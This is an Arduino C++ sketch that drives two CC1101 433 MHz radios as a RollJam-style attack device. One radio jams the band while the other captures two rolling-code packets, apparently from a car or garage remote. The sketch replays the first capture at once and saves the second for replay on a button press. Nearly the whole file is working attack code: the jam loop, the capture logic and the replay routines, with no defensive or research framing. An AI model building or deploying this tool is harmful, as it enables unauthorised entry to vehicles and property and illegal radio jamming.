/**
 * Type of transfers
 */
#define WRITE_BURST              0x40
#define READ_SINGLE              0x80
#define READ_BURST               0xC0

/**
 * Type of register
 */
#define CC1101_CONFIG_REGISTER   READ_SINGLE
#define CC1101_STATUS_REGISTER   READ_BURST

/**
 * PATABLE & FIFO's
 */
#define CC1101_PATABLE           0x3E        // PATABLE address
#define CC1101_TXFIFO            0x3F        // TX FIFO address
#define CC1101_RXFIFO            0x3F        // RX FIFO address

/**
 * Command strobes
 */
#define CC1101_SRES              0x30        // Reset CC1101 chip
#define CC1101_SFSTXON           0x31        // Enable and calibrate frequency synthesizer (if MCSM0.FS_AUTOCAL=1). If in RX (with CCA):
                                             // Go to a wait state where only the synthesizer is running (for quick RX / TX turnaround).
#define CC1101_SXOFF             0x32        // Turn off crystal oscillator
#define CC1101_SCAL              0x33        // Calibrate frequency synthesizer and turn it off. SCAL can be strobed from IDLE mode without
                                             // setting manual calibration mode (MCSM0.FS_AUTOCAL=0)
#define CC1101_SRX               0x34        // Enable RX. Perform calibration first if coming from IDLE and MCSM0.FS_AUTOCAL=1
#define CC1101_STX               0x35        // In IDLE state: Enable TX. Perform calibration first if MCSM0.FS_AUTOCAL=1.
                                             // If in RX state and CCA is enabled: Only go to TX if channel is clear
#define CC1101_SIDLE             0x36        // Exit RX / TX, turn off frequency synthesizer and exit Wake-On-Radio mode if applicable
#define CC1101_SWOR              0x38        // Start automatic RX polling sequence (Wake-on-Radio) as described in Section 19.5 if
                                             // WORCTRL.RC_PD=0
#define CC1101_SPWD              0x39        // Enter power down mode when CSn goes high
#define CC1101_SFRX              0x3A        // Flush the RX FIFO buffer. Only issue SFRX in IDLE or RXFIFO_OVERFLOW states
#define CC1101_SFTX              0x3B        // Flush the TX FIFO buffer. Only issue SFTX in IDLE or TXFIFO_UNDERFLOW states
#define CC1101_SWORRST           0x3C        // Reset real time clock to Event1 value
#define CC1101_SNOP              0x3D        // No operation. May be used to get access to the chip status byte

/**
 * Status registers
 */
#define CC1101_PARTNUM           0x30        // Chip ID
#define CC1101_VERSION           0x31        // Chip ID
#define CC1101_FREQEST           0x32        // Frequency Offset Estimate from Demodulator
#define CC1101_LQI               0x33        // Demodulator Estimate for Link Quality
#define CC1101_RSSI              0x34        // Received Signal Strength Indication
#define CC1101_MARCSTATE         0x35        // Main Radio Control State Machine State
#define CC1101_WORTIME1          0x36        // High Byte of WOR Time
#define CC1101_WORTIME0          0x37        // Low Byte of WOR Time
#define CC1101_PKTSTATUS         0x38        // Current GDOx Status and Packet Status
#define CC1101_VCO_VC_DAC        0x39        // Current Setting from PLL Calibration Module
#define CC1101_TXBYTES           0x3A        // Underflow and Number of Bytes
#define CC1101_RXBYTES           0x3B        // Overflow and Number of Bytes
#define CC1101_RCCTRL1_STATUS    0x3C        // Last RC Oscillator Calibration Result
#define CC1101_RCCTRL0_STATUS    0x3D        // Last RC Oscillator Calibration Result 

/**
 * CC1101 configuration registers
 */
#define CC1101_IOCFG2            0x00        // GDO2 Output Pin Configuration
#define CC1101_IOCFG1            0x01        // GDO1 Output Pin Configuration
#define CC1101_IOCFG0            0x02        // GDO0 Output Pin Configuration
#define CC1101_FIFOTHR           0x03        // RX FIFO and TX FIFO Thresholds
#define CC1101_SYNC1             0x04        // Sync Word, High Byte
#define CC1101_SYNC0             0x05        // Sync Word, Low Byte
#define CC1101_PKTLEN            0x06        // Packet Length
#define CC1101_PKTCTRL1          0x07        // Packet Automation Control
#define CC1101_PKTCTRL0          0x08        // Packet Automation Control
#define CC1101_ADDR              0x09        // Device Address
#define CC1101_CHANNR            0x0A        // Channel Number
#define CC1101_FSCTRL1           0x0B        // Frequency Synthesizer Control
#define CC1101_FSCTRL0           0x0C        // Frequency Synthesizer Control
#define CC1101_FREQ2             0x0D        // Frequency Control Word, High Byte
#define CC1101_FREQ1             0x0E        // Frequency Control Word, Middle Byte
#define CC1101_FREQ0             0x0F        // Frequency Control Word, Low Byte
#define CC1101_MDMCFG4           0x10        // Modem Configuration
#define CC1101_MDMCFG3           0x11        // Modem Configuration
#define CC1101_MDMCFG2           0x12        // Modem Configuration
#define CC1101_MDMCFG1           0x13        // Modem Configuration
#define CC1101_MDMCFG0           0x14        // Modem Configuration
#define CC1101_DEVIATN           0x15        // Modem Deviation Setting
#define CC1101_MCSM2             0x16        // Main Radio Control State Machine Configuration
#define CC1101_MCSM1             0x17        // Main Radio Control State Machine Configuration
#define CC1101_MCSM0             0x18        // Main Radio Control State Machine Configuration
#define CC1101_FOCCFG            0x19        // Frequency Offset Compensation Configuration
#define CC1101_BSCFG             0x1A        // Bit Synchronization Configuration
#define CC1101_AGCCTRL2          0x1B        // AGC Control
#define CC1101_AGCCTRL1          0x1C        // AGC Control
#define CC1101_AGCCTRL0          0x1D        // AGC Control
#define CC1101_WOREVT1           0x1E        // High Byte Event0 Timeout
#define CC1101_WOREVT0           0x1F        // Low Byte Event0 Timeout
#define CC1101_WORCTRL           0x20        // Wake On Radio Control
#define CC1101_FREND1            0x21        // Front End RX Configuration
#define CC1101_FREND0            0x22        // Front End TX Configuration
#define CC1101_FSCAL3            0x23        // Frequency Synthesizer Calibration
#define CC1101_FSCAL2            0x24        // Frequency Synthesizer Calibration
#define CC1101_FSCAL1            0x25        // Frequency Synthesizer Calibration
#define CC1101_FSCAL0            0x26        // Frequency Synthesizer Calibration
#define CC1101_RCCTRL1           0x27        // RC Oscillator Configuration
#define CC1101_RCCTRL0           0x28        // RC Oscillator Configuration
#define CC1101_FSTEST            0x29        // Frequency Synthesizer Calibration Control
#define CC1101_PTEST             0x2A        // Production Test
#define CC1101_AGCTEST           0x2B        // AGC Test
#define CC1101_TEST2             0x2C        // Various Test Settings
#define CC1101_TEST1             0x2D        // Various Test Settings
#define CC1101_TEST0             0x2E        // Various Test Settings


/**
 * Default Values
 */
#define CC1101_DEFVAL_IOCFG2     0x2E        // GDO2 Output Pin Configuration
#define CC1101_DEFVAL_IOCFG1     0x2E        // GDO1 Output Pin Configuration
#define CC1101_DEFVAL_IOCFG0     0x06        // GDO0 Output Pin Configuration
#define CC1101_DEFVAL_FIFOTHR    0x47        // RX FIFO and TX FIFO Thresholds
#define CC1101_DEFVAL_SYNC1      0xAA        // Synchronization word, high byte AB
#define CC1101_DEFVAL_SYNC0      0x00        // Synchronization word, low byte  FC

#define CC1101_DEFVAL_PKTLEN     0x19       // Packet Length                               FF
#define CC1101_DEFVAL_PKTCTRL1   0x04        // Packet Automation Control
#define CC1101_DEFVAL_PKTCTRL0   0x04        // Packet Automation Control

#define CC1101_DEFVAL_ADDR       0x00        // Device Address
#define CC1101_DEFVAL_CHANNR     0x00        // Channel Number

#define CC1101_DEFVAL_FSCTRL1    0x06        // Frequency Synthesizer Control
#define CC1101_DEFVAL_FSCTRL0    0x00        // Frequency Synthesizer Control

// Carrier frequency = 433.795 MHz
#define CC1101_DEFVAL_FREQ2_433  0x10        // Frequency Control Word, High Byte
#define CC1101_DEFVAL_FREQ1_433  0xAF        // Frequency Control Word, Middle Byte
#define CC1101_DEFVAL_FREQ0_433  0xC1      // Frequency Control Word, Low Byte               38   

// Carrier frequency Jammer
#define CC1101_DEFVAL_FREQ2_433_JAMMER  0x10        // Frequency Control Word, High Byte
#define CC1101_DEFVAL_FREQ1_433_JAMMER  0xAC        // Frequency Control Word, Middle Byte
#define CC1101_DEFVAL_FREQ0_433_JAMMER  0x4E       // Frequency Control Word, Low Byte               38   

#define CC1101_DEFVAL_MDMCFG4    0xF6      // Modem Configuration
#define CC1101_DEFVAL_MDMCFG3    0x9F        // Modem Configuration                          C3
#define CC1101_DEFVAL_MDMCFG2    0x32        // Modem Configuration
#define CC1101_DEFVAL_MDMCFG1    0x02        // Modem Configuration       02                  ??????????????
#define CC1101_DEFVAL_MDMCFG0    0xF8        // Modem Configuration       F8

#define CC1101_DEFVAL_DEVIATN    0x15        // Modem Deviation Setting
#define CC1101_DEFVAL_MCSM2      0x07        // Main Radio Control State Machine Configuration
#define CC1101_DEFVAL_MCSM1      0x20        // Main Radio Control State Machine Configuration
#define CC1101_DEFVAL_MCSM0      0x18        // Main Radio Control State Machine Configuration

#define CC1101_DEFVAL_FOCCFG     0x16        // Frequency Offset Compensation Configuration
#define CC1101_DEFVAL_BSCFG      0x6C        // Bit Synchronization Configuration
#define CC1101_DEFVAL_AGCCTRL2   0x03        // AGC Control
#define CC1101_DEFVAL_AGCCTRL1   0x40        // AGC Control
#define CC1101_DEFVAL_AGCCTRL0   0x91        // AGC Control
#define CC1101_DEFVAL_WOREVT1    0x87        // High Byte Event0 Timeout
#define CC1101_DEFVAL_WOREVT0    0x6B        // Low Byte Event0 Timeout
#define CC1101_DEFVAL_WORCTRL    0xFB        // Wake On Radio Control
#define CC1101_DEFVAL_FREND1     0x56        // Front End RX Configuration
#define CC1101_DEFVAL_FREND0     0x11        // Front End TX Configuration
#define CC1101_DEFVAL_FSCAL3     0xE9        // Frequency Synthesizer Calibration
#define CC1101_DEFVAL_FSCAL2     0x2A        // Frequency Synthesizer Calibration
#define CC1101_DEFVAL_FSCAL1     0x00        // Frequency Synthesizer Calibration
#define CC1101_DEFVAL_FSCAL0     0x1F        // Frequency Synthesizer Calibration
#define CC1101_DEFVAL_RCCTRL1    0x41        // RC Oscillator Configuration
#define CC1101_DEFVAL_RCCTRL0    0x00        // RC Oscillator Configuration
#define CC1101_DEFVAL_FSTEST     0x59        // Frequency Synthesizer Calibration Control
#define CC1101_DEFVAL_PTEST      0x7F        // Production Test
#define CC1101_DEFVAL_AGCTEST    0x3F        // AGC Test
#define CC1101_DEFVAL_TEST2      0x88        // Various Test Settings                         88                   
#define CC1101_DEFVAL_TEST1      0x35        // Various Test Settings                         31
#define CC1101_DEFVAL_TEST0      0x0B        // Various Test Settings                         0b

/**
 * Macros
 */
// Enter Rx state
#define setRxState()              cmdStrobe(CC1101_SRX)
// Enter Tx state
#define setTxState()              cmdStrobe(CC1101_STX)
// Enter IDLE state
#define setIdleState()            cmdStrobe(CC1101_SIDLE)
// Flush Rx FIFO
#define flushRxFifo()             cmdStrobe(CC1101_SFRX)
// Flush Tx FIFO
#define flushTxFifo()             cmdStrobe(CC1101_SFTX)

// Select (SPI) CC1101
#define cc1101_Select()  if(chipSelectRX) digitalWrite(cs_rx, LOW); else digitalWrite(cs_jam, LOW)
// Deselect (SPI) CC1101
#define cc1101_Deselect()  if(chipSelectRX) digitalWrite(cs_rx, HIGH); else digitalWrite(cs_jam, HIGH)
// Wait until SPI MISO line goes low
#define wait_Miso() while(bitRead(PORT_SPI_MISO, BIT_SPI_MISO))
// Wait until rx GDO0 line goes high
#define wait_GDO0_high()  while(!get_GDO0_state())
// Wait until rx GDO0 line goes low
#define wait_GDO0_low()  while(get_GDO0_state())
// Read CC1101 Config register
#define readConfigReg(regAddr)    readReg(regAddr, CC1101_CONFIG_REGISTER)
// Read CC1101 Status register
#define readStatusReg(regAddr)    readReg(regAddr, CC1101_STATUS_REGISTER)
// Get Marcstate
#define getMarcstate() (readStatusReg(CC1101_MARCSTATE) & 0x1F)

//Defince gdo0_rx port/bit
#define PORT_GDO0_RX  PIND
#define BIT_GDO0_RX  2

//Defince gdo0_jam port/bit
#define PORT_GDO0_JAM  PIND
#define BIT_GDO0_JAM  3

//Define MISO port/bit
#define PORT_SPI_MISO  PINB
#define BIT_SPI_MISO  4

/**
 * Define the CCPACKET class which will handle packets.
 * 
 * Buffer and data lengths
 */
#define CC1101_BUFFER_LEN        64
#define CC1101_DATA_LEN          CC1101_BUFFER_LEN - 3

class CCPACKET
{
  public:
    /**
     * Data length
     */
    byte length;

    /**
     * Data buffer
     */
    byte data[CC1101_DATA_LEN];

    /**
     * CRC OK flag
     */
    boolean crc_ok;

    /**
     * Received Strength Signal Indication
     */
    byte rssi;

    /**
     * Link Quality Index
     */
    byte lqi;
};



/**
 * Pin numbers, Global variables
 */

#include <SPI.h>

int cs_rx = 10;
int cs_jam = 20;
int gdo0_rx = 2;
int gdo0_jam = 3;

int mosi = 11;
int miso = 12;

int pushButton = 4;

int packetCounter;
CCPACKET jamData;

boolean chipSelectRX;
boolean jammin= true;
volatile bool rxTrigger = false;

CCPACKET receivedPackets[2];

void setup() 
{
  // Pin setup
  pinMode(cs_rx, OUTPUT);
  pinMode(cs_jam, OUTPUT);
  pinMode(gdo0_rx, INPUT);
  pinMode(gdo0_jam, INPUT);
  pinMode(pushButton, INPUT);
  
  Serial.begin(9600);
  SPI.begin();
  delay(2000);

  chipSelectRX = false;
  chip_reset();
  delay(100);
  chipSelectRX = true;
  chip_reset();
  delay(100);

//
setupJammer();
Serial.println("Jammer initialized.");
Serial.println("");
setupReceiver(); 
Serial.println("Receiver initialized, entered RX state.");
Serial.println("");
startJammer();
delay(500);
replayFirst();
replaySecond();
  
}

  void setupJammer()
  {
    chipSelectRX = false;
    cc1101_Select();
    wait_Miso();
    setDefaultRegs();
    writeReg(CC1101_FREQ1, CC1101_DEFVAL_FREQ1_433_JAMMER);
    writeReg(CC1101_FREQ0, CC1101_DEFVAL_FREQ0_433_JAMMER);
    writeReg(CC1101_SYNC1, 0x47);
    writeReg(CC1101_SYNC0, 0x91);
    writeReg(CC1101_MDMCFG4,  0xF5);
    writeReg(CC1101_MDMCFG3,  0xE4);
    writeReg(CC1101_MDMCFG2,  0x30);
    writeReg(CC1101_MDMCFG1,  0x23);
    writeReg(CC1101_MDMCFG0,  0xFF);
    set_patable_jam();
    cc1101_Deselect();  
    CCPACKET jamPacket = getJamPacket();
    jamData = jamPacket;   
  }

  void setupReceiver()
  {
    chipSelectRX = true;
    cc1101_Select();
    wait_Miso();
    setDefaultRegs();
    set_patable();
    setRxState();
    attachInterrupt(digitalPinToInterrupt(2), isr, FALLING);   
    cc1101_Deselect();   
  }


  void startJammer()
  { 
      Serial.println("Starting up the jammer.....");
      Serial.println("");
      while(jammin)
      {
         chipSelectRX = false;
         rxTrigger = false;
         cc1101_Select();
         wait_Miso();

         delayMicroseconds(8000);
         sendPacket(jamData); 
         if(rxTrigger)
         {
         cc1101_Deselect();
         getData();
         }
      }
      detachInterrupt(digitalPinToInterrupt(2));
      chipSelectRX = false;
      cc1101_Select();
      wait_Miso();
      chip_reset();
      setupJammer();
      //Utolsó jelek felfogása
      for(int i = 0; i < 5; i++)
      {
         delayMicroseconds(8000);
         sendPacket(jamData); 
      }
      //Enter IDLE state with the jammer.
      chipSelectRX = false;
      cmdStrobe(CC1101_SIDLE);        
  }

  void replayFirst()
  {
      Serial.println("Starting the replay...");
      Serial.println("");
      detachInterrupt(digitalPinToInterrupt(2));
      chipSelectRX = true;
      cc1101_Select();
      wait_Miso();

      for(int i=0; i < 3; i++)
      {
        sendPacket(receivedPackets[0]);
        delayMicroseconds(12800);
      }
      Serial.println("Replay packet: ");
       for (int i = 0; i < receivedPackets[0].length; i++)
       {
         Serial.print("0x");
         Serial.print(receivedPackets[0].data[i], HEX);
         Serial.println("");
       }
  }

  void replaySecond()
  {
      Serial.println("");
      Serial.println("Waiting for button press...");
      Serial.println("");
      while(digitalRead(pushButton) == LOW)
      {
        delay(100);  
      }
      chipSelectRX = true;
      cc1101_Select();
      wait_Miso();

      for(int i=0; i < 3; i++)
      {
        sendPacket(receivedPackets[1]);
        delayMicroseconds(12800);
      }
      
       Serial.println("Replaying packet: ");
       for (int i = 0; i < receivedPackets[1].length; i++)
       {
         Serial.print("0x");
         Serial.print(receivedPackets[1].data[i], HEX);
         Serial.println("");
       }
       
      cc1101_Deselect();
  }

  CCPACKET getJamPacket()
  {
     CCPACKET jamData;
     byte thing[10] = {0x92, 0x81, 0xDA, 0x39, 0xDC, 0x27, 0x49, 0xC3, 0xAC, 0x15};
     memcpy(jamData.data, thing, sizeof(jamData.data));

     jamData.length = sizeof(thing);
     return jamData;
    }

  void getData()
  {
    detachInterrupt(digitalPinToInterrupt(2));
    CCPACKET packet;
  
    rxTrigger = false;
    chipSelectRX = true;
    cc1101_Select();
    wait_Miso();

    if(receivePacket(&packet) > 0)
    {
       if (packetCounter == 0)
       {
         receivedPackets[0] = packet; 
         Serial.println("Got one packet!");
         Serial.println("");
         packetCounter++;
//         chip_reset();
//         setupReceiver();
       }
       else if(packetCounter == 1)
       {
         //Check for same packet. (Button pressed longer)
         if(receivedPackets[0].data[5] == packet.data[5] && receivedPackets[0].data[6] == packet.data[6])
         {
           delayMicroseconds(100);
         }
         else
         {
         receivedPackets[1] = packet;
         jammin = false;
         Serial.println("Got the second one!");
         Serial.println("");
         packetCounter = 0;
         }
       }
    }
    //FFor ciklus késleltetéshez
    cc1101_Deselect();
    attachInterrupt(digitalPinToInterrupt(2), isr, FALLING);
  }


  /**
 * sendData
 * 
 * Send data packet via RF
 * 
 * 'packet'  Packet to be transmitted. First byte is the destination address
 *
 *  Return:
 *    True if the transmission succeeds
 *    False otherwise
 */

  boolean sendPacket(CCPACKET packet)
  {
    byte marcState;
    bool res = false;


    //Declare to be in Tx state. Avoid receive while transmit.
    setRxState();

    while(((marcState = getMarcstate()) & 0x1F) != 0x0D)
    {

        if (marcState == 0x11)   //RX OVERFLOW
          flushRxFifo();
    }

    delayMicroseconds(500);

    //Set data length at the firs position of TX FIFO
    writeBurstReg(CC1101_TXFIFO, packet.data, packet.length);

    //Enter TX state
    setTxState();

    //Check that TX entered
    marcState = getMarcstate() & 0x1F;
    if((marcState != 0x13) && (marcState != 0x14) && (marcState != 0x15)){
        setIdleState(); //Enter IDLE
        flushTxFifo();  //Flush FIFO
        setRxState();   //Back to RX

        return false;
      }

      //Wait for the sync word transmission
      wait_GDO0_high();

      //Wait for the end of packet transmision
      wait_GDO0_low();

      if((readStatusReg(CC1101_TXBYTES) & 0x7F) == 0)
      {
        res = true;
      }

      setIdleState();  
      flushTxFifo();
      setRxState();

      return res;
  }

  /**
 * receiveData
 * 
 * Read data packet from RX FIFO
 *
 * 'packet'  Container for the packet received
 * 
 * Return:
 *  Amount of bytes received
 */


  byte receivePacket(CCPACKET * packet)
  {
    byte val;
    byte rxBytes = readStatusReg(CC1101_RXBYTES);
    
    //FIFO OVERFLOW?
    if(getMarcstate() == 0x11)
    {
       setIdleState();  //Enter IDLE
       flushRxFifo();
       packet->length = 0;
    }

    //Any byte to read?
    else if(rxBytes & 0x7F)
    {
       //Read data length
       packet->length = readStatusReg(CC1101_RXBYTES) & 0x7F;

       //If packet too long
       if(packet->length > CC1101_DATA_LEN)
       {
          packet->length = 0; //Discard packet 
       }
       else
       {
          //Read data packet
          readBurstReg(packet->data, CC1101_RXFIFO, packet->length);
          //Read RSSI
          packet->rssi = readConfigReg(CC1101_RXFIFO);
          //Read LQI and CRC OK
          val = readConfigReg(CC1101_RXFIFO);
          packet->lqi = val & 0x7f;
          packet->crc_ok = bitRead(val, 7);
       }
       //Flush FIFO
       flushRxFifo();
    }
    else
      packet->length = 0;
    
    //Back to RX
    setRxState();

    return packet->length;
  }


    byte readReg(byte regAddr, byte regType)
  {

    byte addr, val;
    addr = regAddr | regType;

    cc1101_Select();
    wait_Miso();
    SPI.transfer(addr);
    val = SPI.transfer(0x42);
    cc1101_Deselect();

    return val;   
  }

  void readBurstReg(byte * myBuffer, byte regAddr, byte len)
  {
      byte addr, i;

      addr = regAddr | READ_BURST;
      cc1101_Select();
      wait_Miso();
      SPI.transfer(addr);
      for(i=0; i<len; i++)
      {
          myBuffer[i] = SPI.transfer(0x00);
      }
      cc1101_Deselect();
  }

  void writeReg(byte regAddr, byte value)
  {
    cc1101_Select();
    wait_Miso();
    SPI.transfer(regAddr);
    SPI.transfer(value);
    cc1101_Deselect();
  }

  void writeBurstReg(byte regAddr, byte* myBuffer, byte len)
  {
    byte addr, i;

    addr = regAddr | WRITE_BURST;
    cc1101_Select();
    wait_Miso();
    SPI.transfer(addr);

    for(i=0; i<len; i++)
    {
        SPI.transfer(myBuffer[i]);
    }
    cc1101_Deselect();
  }

  void cmdStrobe(byte cmd)
  {
    cc1101_Select();
    wait_Miso();
    SPI.transfer(cmd);
    cc1101_Deselect();
  }

  void chip_reset()
  {
    cc1101_Deselect();                    // Deselect CC1101
    delayMicroseconds(5);
    cc1101_Select();                      // Select CC1101
    delayMicroseconds(10);
    cc1101_Deselect();                    // Deselect CC1101
    delayMicroseconds(41);
    cc1101_Select();                      // Select CC1101

    wait_Miso();
    SPI.transfer(CC1101_SRES);
    wait_Miso();

    cc1101_Deselect();
  }

  void set_patable()
  {
    byte PA_TABLE[] = {0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    writeBurstReg(CC1101_PATABLE, PA_TABLE, 8);
  }

  void set_patable_jam()
  {
    byte PA_TABLE[] = {0x00, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    writeBurstReg(CC1101_PATABLE, PA_TABLE, 8);
  }

  void isr()
  {
    rxTrigger = true;  
  }

  boolean get_GDO0_state()
  {
    if(chipSelectRX) return bitRead(PORT_GDO0_RX, BIT_GDO0_RX); else return bitRead(PORT_GDO0_JAM, BIT_GDO0_JAM);
  }

  void setDefaultRegs() 
  {
  writeReg(CC1101_IOCFG2,  CC1101_DEFVAL_IOCFG2);
  writeReg(CC1101_IOCFG1,  CC1101_DEFVAL_IOCFG1);
  writeReg(CC1101_IOCFG0,  CC1101_DEFVAL_IOCFG0);
  writeReg(CC1101_FIFOTHR,  CC1101_DEFVAL_FIFOTHR);
  writeReg(CC1101_PKTLEN,  CC1101_DEFVAL_PKTLEN);
  writeReg(CC1101_PKTCTRL1,  CC1101_DEFVAL_PKTCTRL1);
  writeReg(CC1101_PKTCTRL0,  CC1101_DEFVAL_PKTCTRL0);

  // Set default synchronization word
  writeReg(CC1101_SYNC1,  CC1101_DEFVAL_SYNC1);
  writeReg(CC1101_SYNC0,  CC1101_DEFVAL_SYNC0);

  // Set default device address
  writeReg(CC1101_ADDR, CC1101_DEFVAL_ADDR);
  // Set default frequency channel
  writeReg(CC1101_FREQ2, CC1101_DEFVAL_FREQ2_433);
  writeReg(CC1101_FREQ1, CC1101_DEFVAL_FREQ1_433);
  writeReg(CC1101_FREQ0, CC1101_DEFVAL_FREQ0_433);
  
  writeReg(CC1101_CHANNR,  CC1101_DEFVAL_CHANNR);

  writeReg(CC1101_FSCTRL1,  CC1101_DEFVAL_FSCTRL1);
  writeReg(CC1101_FSCTRL0,  CC1101_DEFVAL_FSCTRL0);

  writeReg(CC1101_MDMCFG4,  CC1101_DEFVAL_MDMCFG4);
  writeReg(CC1101_MDMCFG3,  CC1101_DEFVAL_MDMCFG3);
  writeReg(CC1101_MDMCFG2,  CC1101_DEFVAL_MDMCFG2);
  writeReg(CC1101_MDMCFG1,  CC1101_DEFVAL_MDMCFG1);
  writeReg(CC1101_MDMCFG0,  CC1101_DEFVAL_MDMCFG0);
  writeReg(CC1101_DEVIATN,  CC1101_DEFVAL_DEVIATN);

  writeReg(CC1101_PKTLEN,  CC1101_DEFVAL_PKTLEN);
  writeReg(CC1101_PKTCTRL1,  CC1101_DEFVAL_PKTCTRL1);
  writeReg(CC1101_PKTCTRL0,  CC1101_DEFVAL_PKTCTRL0);

  writeReg(CC1101_MCSM2,  CC1101_DEFVAL_MCSM2);
  writeReg(CC1101_MCSM1,  CC1101_DEFVAL_MCSM1);
  writeReg(CC1101_MCSM0,  CC1101_DEFVAL_MCSM0);
  writeReg(CC1101_FOCCFG,  CC1101_DEFVAL_FOCCFG);
  writeReg(CC1101_BSCFG,  CC1101_DEFVAL_BSCFG);
  writeReg(CC1101_AGCCTRL2,  CC1101_DEFVAL_AGCCTRL2);
  writeReg(CC1101_AGCCTRL1,  CC1101_DEFVAL_AGCCTRL1);
  writeReg(CC1101_AGCCTRL0,  CC1101_DEFVAL_AGCCTRL0);
  writeReg(CC1101_WOREVT1,  CC1101_DEFVAL_WOREVT1);
  writeReg(CC1101_WOREVT0,  CC1101_DEFVAL_WOREVT0);
  writeReg(CC1101_WORCTRL,  CC1101_DEFVAL_WORCTRL);
  writeReg(CC1101_FREND1,  CC1101_DEFVAL_FREND1);
  writeReg(CC1101_FREND0,  CC1101_DEFVAL_FREND0);
  writeReg(CC1101_FSCAL3,  CC1101_DEFVAL_FSCAL3);
  writeReg(CC1101_FSCAL2,  CC1101_DEFVAL_FSCAL2);
  writeReg(CC1101_FSCAL1,  CC1101_DEFVAL_FSCAL1);
  writeReg(CC1101_FSCAL0,  CC1101_DEFVAL_FSCAL0);
  writeReg(CC1101_RCCTRL1,  CC1101_DEFVAL_RCCTRL1);
  writeReg(CC1101_RCCTRL0,  CC1101_DEFVAL_RCCTRL0);
  writeReg(CC1101_FSTEST,  CC1101_DEFVAL_FSTEST);
  writeReg(CC1101_PTEST,  CC1101_DEFVAL_PTEST);
  writeReg(CC1101_AGCTEST,  CC1101_DEFVAL_AGCTEST);
  writeReg(CC1101_TEST2,  CC1101_DEFVAL_TEST2);
  writeReg(CC1101_TEST1,  CC1101_DEFVAL_TEST1);
  writeReg(CC1101_TEST0,  CC1101_DEFVAL_TEST0);
  }

// It's an ON-OFF program, Loop is irrelevant  
void loop() 
{
}
